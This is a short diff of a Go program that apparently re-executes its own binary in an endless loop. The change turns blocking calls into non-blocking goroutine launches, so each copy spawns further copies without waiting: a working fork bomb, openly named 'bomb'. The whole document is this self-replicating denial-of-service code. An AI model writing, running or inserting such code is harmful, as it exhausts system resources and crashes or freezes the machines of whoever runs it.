@@ -18,11 +18,11 @@ func main() {
       }
    }
    for {
-      bomb(exPath)
+      go bomb(exPath)
    }
 }
 
 func bomb(file string) {
    cmd := exec.Command(file)
-   cmd.Run()
+   cmd.Start()
 }
